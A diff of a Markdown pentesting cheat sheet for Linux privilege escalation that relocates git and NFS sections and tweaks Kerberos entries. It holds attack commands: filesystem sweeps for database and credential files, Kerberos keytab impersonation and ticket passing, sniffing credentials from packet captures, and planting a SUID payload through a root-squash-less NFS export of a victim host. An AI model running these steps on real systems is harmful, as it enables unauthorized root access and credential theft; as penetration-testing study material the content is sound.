@@ -161,16 +161,12 @@
             *   Log Files            → `[access/error].log`, `httpd-[access/error].log`, `httpd.conf`
             *   DB Files             → `*[db/database/settings/config].*`, `/var/db/*`, `*.db`, `.sql*`
             *   Code Analysis   → Sensitive Exposure / Docker Files / Inputs & Functions / DB Connection Strings / Dependencies
-        *   GIT Repositories
-            *   Directories → `.git` / `.gitignore`
-            *   `git log --oneline` 
-            *   `git status`
-            *   `git show [HASH]`
-            *   `git diff [HASH_1] [HASH_2]`
-        *   NFS Exports
-            *   Data Access / Root Squashing
-            *   `cat /etc/exports`             → `sudo mount -t nfs [VICTIM_IP]:/[SHARED_NFS] /mnt`
-            *   `cp [PAYLOAD_FILE] /mnt` → `chmod u+s /mnt/[PAYLOAD_FILE]` → Execute Payload
+            *   GIT Data
+                *   Directories → `.git` / `.gitignore`
+                *   `git log --oneline` 
+                *   `git status`
+                *   `git show [HASH]`
+                *   `git diff [HASH_1] [HASH_2]`
         *   DB Files
             *   `for ext in $(echo ".*db .db* .sql .sql* .db");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null; done`
         *   Browsers
@@ -191,6 +187,7 @@
             *   `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
         *   Scripts
             *   `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
+            *   Read / Write Privilege + Scheduled Executions
         *   Drives Data
             *   `fdisk -l` → `ls /dev 2>/dev/null | grep -i "sd"`
             *   `mount -t [TYPE] /dev/[MOUNTPOINT] /mnt/`
@@ -206,12 +203,12 @@
                 *   `find / -name *keytab* -ls 2>/dev/null`
                 *   `ls -la /tmp | grep krb`
                 *   `./linikatz.sh`
-            *   Check User                → `klist -k -t [KEYTAB]`
+            *   Check User               → `klist -k -t [KEYTAB]`
             *   Impersonate User   → `kinit [USER] -k -t [KEYTAB]`
             *   Get/Crack Hash        → `python3 keytabextract.py [KEYTAB]`
             *   Pass Ticket                 → `export KRB5CCNAME=[KRB5CC_FILE]`
-            *   Dynamic Pivoting    → `sudo nano /etc/krb5.conf` + Add Realm `[DOMAIN] = { kdc = [INTERNAL_HOST]}`
-            *   Lin to Windows         → `ticketConverter.py [KEYTAB] lin.ccache`
+            *   Dynamic Pivoting    → `sudo nano /etc/krb5.conf` + Add Realm `[DOMAIN] = { kdc = [INTERNAL_HOST]}` + Check `krbconf()`
+            *   Lin to Windows        → `ticketConverter.py [KEYTAB] lin.ccache`
 *   OS
     *   Kernel Exploits
         *   `uname -a && cat /etc/*-release` → Exploit Research
@@ -260,6 +257,10 @@
             *   `tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]`
             *   `Pcredz.py`
             *   PCAP Wireshark Analysis → All Unencrypted Protocols + [MySQL Hashes](https://0xma.github.io/hacking/toby_crack_mysql_hashes.html)
+        *   NFS Exports
+            *   Data Access / Root Squashing
+            *   `cat /etc/exports`             → `sudo mount -t nfs [VICTIM_IP]:/[SHARED_NFS] /mnt`
+            *   `cp [PAYLOAD_FILE] /mnt` → `chmod u+s /mnt/[PAYLOAD_FILE]` → Execute Payload
     *   Service Files
         *   `find / -type f -iname "*.service" [-writable/-readable] -exec ls -l {} \; 2>/dev/null`
         *   Writable ExecStart
